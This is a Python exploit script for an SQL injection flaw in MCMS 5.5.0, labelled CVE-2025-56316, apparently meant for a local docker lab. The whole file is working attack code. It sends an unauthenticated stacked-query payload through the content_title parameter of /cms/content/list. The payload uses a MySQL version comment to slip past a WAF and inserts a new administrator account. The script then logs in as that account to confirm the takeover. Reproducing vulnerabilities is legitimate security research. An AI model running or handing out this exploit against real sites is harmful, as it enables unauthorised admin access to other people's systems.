#!/usr/bin/env python3
import requests
import hashlib
import sys

TARGET_URL = "http://localhost:8081"

def exploit():
    print("=" * 60)
    print("CVE-2025-56316 - MCMS 5.5.0 SQL Injection -> Privilege Escalation")
    print("Endpoint: /cms/content/list (Unauthenticated)")
    print("Parameter: content_title")
    print("Type: Stacked Query SQL Injection")
    print("=" * 60)
    print()

    session = requests.Session()
    
    test_user = "pwned"
    test_pass = "pwned123"
    test_pass_md5 = hashlib.md5(test_pass.encode()).hexdigest()
    
    print(f"[*] Creating admin user: {test_user}")
    print(f"[*] Password: {test_pass}")
    print(f"[*] Password MD5: {test_pass_md5}")
    print()
    
    # Stacked query SQL injection payload
    # Uses MySQL version comment /*!50000INSERT*/ to bypass WAF
    # The vulnerable SQL template is:
    # and content_title like CONCAT(CONCAT('%','${content_title}'),'%')
    # We close the CONCAT and inject our stacked query
    payload = f"'),0);/*!50000INSERT*/ INTO manager(manager_name,manager_password,ROLE_IDS) VALUES('{test_user}','{test_pass_md5}','1');-- "
    
    print("[*] Payload:")
    print(f"    {payload}")
    print()
    
    print("[*] Sending exploit to /cms/content/list...")
    resp = session.get(f"{TARGET_URL}/cms/content/list", params={
        "typeid": "1666653706550321153",
        "content_title": payload
    })
    
    print(f"[*] Response status: {resp.status_code}")
    print()
    
    print("[*] Verifying exploitation by attempting login...")
    session2 = requests.Session()
    session2.get(f"{TARGET_URL}/ms/login.do")
    
    login_resp = session2.post(
        f"{TARGET_URL}/ms/login.do",
        data={
            "managerName": test_user,
            "managerPassword": test_pass,
            "rand_code": "1234"
        },
        headers={"X-Requested-With": "XMLHttpRequest"}
    )
    
    print(f"[*] Login response: {login_resp.text[:200]}")
    print()
    
    if '"result" : true' in login_resp.text or '"result":true' in login_resp.text:
        print("=" * 60)
        print("[+] EXPLOITATION SUCCESSFUL!")
        print(f"[+] Created admin user: {test_user} / {test_pass}")
        print("[+] CVE-2025-56316 verified - Privilege Escalation via SQL Injection")
        print("=" * 60)
        return True
    else:
        print("[-] Exploitation may have failed or user already exists")
        print("[-] Check database manually: SELECT * FROM manager;")
        return False

def main():
    try:
        success = exploit()
        return 0 if success else 1
    except requests.exceptions.ConnectionError:
        print("[-] Cannot connect to target. Is the environment running?")
        print("[-] Start with: docker-compose up -d")
        return 1

if __name__ == "__main__":
    sys.exit(main())
